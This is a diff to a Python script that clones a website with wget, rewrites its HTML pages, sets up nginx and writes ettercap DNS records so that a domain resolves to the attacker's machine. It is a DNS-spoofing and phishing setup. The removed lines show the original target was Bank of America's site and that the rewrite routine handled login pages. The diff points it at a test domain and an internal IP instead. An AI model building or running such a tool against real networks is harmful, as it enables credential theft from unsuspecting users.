@@ -2,7 +2,8 @@ import socket
 import re
 import os
 
-SITE = "www.bankofamerica.com"
+FAKE_DOMAIN = "www.neverssl.com"
+SITE = "10.147.81.155"
 
 def nginx_config():
 	path = "/etc/nginx/nginx.conf"
@@ -28,12 +29,12 @@ def ip_addr():
 def ettercap_dns():
 	path = "/etc/ettercap/etter.dns"
 	ip = ip_addr()
-	text = [SITE[4:] + " A " + ip, "\n", "*" + SITE[3:] + " A " + ip, "\n", SITE + " PTR " + ip]
+	text = [FAKE_DOMAIN[4:] + " A " + ip, "\n", "*" + FAKE_DOMAIN[3:] + " A " + ip, "\n", FAKE_DOMAIN + " PTR " + ip]
 	with open(path, 'w') as file:
                 file.writelines(text)
 	return 0
 
-def check_login_file(path):
+def rewrite_posts(path):
 	print("***CHECKING ", path, "***")
 	with open(path, 'r', encoding='utf-8',errors='ignore') as file:
 		text = file.readlines()
@@ -56,11 +57,11 @@ def parse_files(path):
 		if os.path.isdir(path + "/" + file):
 			parse_files(path + "/" + file)
 		elif file.endswith(".html"):
-			check_login_file(path + "/" + file)
+			rewrite_posts(path + "/" + file)
 	return 0
 
 def main():
-	os.system("rm -r www.*")
+	#os.system("rm -r www.*")
 	os.system("wget --level=2 --recursive --page-requisites --no-parent --convert-links --adjust-extension --no-clobber -e robots=off " + SITE)
 	parse_files(SITE)
 	nginx_config()
